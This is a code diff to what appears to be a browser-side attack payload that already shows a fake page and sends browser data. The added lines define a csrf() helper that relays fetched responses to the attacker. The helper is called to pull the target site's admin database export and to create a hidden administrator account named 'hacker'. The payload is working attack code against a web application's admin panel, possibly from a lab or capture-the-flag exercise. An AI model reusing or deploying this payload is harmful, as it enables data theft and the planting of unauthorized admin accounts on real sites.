@@ -120,5 +120,37 @@ async function showFakePage() {
   }
 }
 
+async function csrf({ url, method, headers, body }) {
+  try {
+    // console.log("sending csrf...");
+
+    const res = await fetch(url, {
+      body,
+      headers,
+      method,
+    });
+
+    const text = await res.text();
+
+    await sendEvent(text);
+  } catch (e) {
+    await sendError("csrf - " + e.message);
+  }
+}
+
 sendBrowserData();
 showFakePage();
+
+// Export database
+csrf({ url: `${TARGET_BASE_URL}/admin/export`, method: "GET" });
+
+// Create a new admin user
+csrf({
+  url: `${TARGET_BASE_URL}/admin/users/create`,
+  method: "POST",
+  body: "name=hacker&email=hacker@answers.local&isAdmin=true&isMod=true",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+  },
+});
+
